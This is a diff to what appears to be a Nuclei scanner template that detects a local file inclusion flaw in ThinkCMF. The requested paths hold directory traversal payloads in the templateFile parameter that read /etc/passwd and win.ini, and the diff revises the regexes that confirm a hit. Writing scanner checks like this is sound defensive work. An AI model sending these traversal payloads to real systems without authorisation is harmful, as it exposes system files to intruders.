@@ -1,4 +1,4 @@
-id: thinkcmf-lfi-3
+id: thinkcmf-lfi
 
 info:
   name: ThinkCMF LFI
@@ -10,16 +10,17 @@ info:
 requests:
   - method: GET
     path:
+      - "{{BaseURL}}/?a=display&templateFile=README.md"
       - "{{BaseURL}}/?a=display&templateFile=../../../../../../../../../../../../../../../../etc/passwd"
       - "{{BaseURL}}/?a=display&templateFile=../../../../../../../../../../../../../../../../windows/win.ini"
 
     matchers-condition: and
     matchers:
-
       - type: regex
         regex:
-          - "root:.*:0:0:"
-          - "bit app support"
+          - "ThinkCMF"
+          - "root:[x*]:0:0:"
+          - "[extensions]"
 
       - type: status
         status:
